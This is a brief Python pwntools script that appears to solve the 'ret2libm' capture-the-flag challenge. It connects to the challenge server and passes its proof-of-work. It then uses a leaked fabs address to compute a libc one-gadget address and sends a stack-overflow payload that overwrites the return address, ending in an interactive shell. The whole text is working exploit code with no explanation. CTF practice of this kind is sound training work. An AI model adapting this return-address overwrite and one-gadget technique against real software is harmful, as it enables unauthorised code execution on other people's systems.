#!/usr/bin/env python3
from pwn import *
import kctfpow

context.log_level = 'debug'
debug = 0
elf = './chal'

if debug:
    io = process([elf])
else:
    io = remote('ret2libm.chal.irisc.tf', 10001)
    io.recvuntil(b'kctf-pow) solve ')
    pow_challenge = io.recvuntil(b'\n').decode()
    pow_solution = kctfpow.solve_challenge(pow_challenge)
    io.recvuntil(b'Solution? ')
    io.send((pow_solution + '\n').encode())



DELTALM = 0x3f1000
DELTAMFABS = 0x31cf0

io.recvuntil("Check out my pecs: ")
FABS = int(io.recvline(), 16)
print(hex(FABS))
io.recvuntil("How about yours? ")

ONEGADGET = FABS - DELTAMFABS - DELTALM + 0x4f302
print(hex(ONEGADGET))

payload = 16 * b'A' + p64(ONEGADGET) + 256 * b'\x00'
io.sendline(payload)

io.interactive()
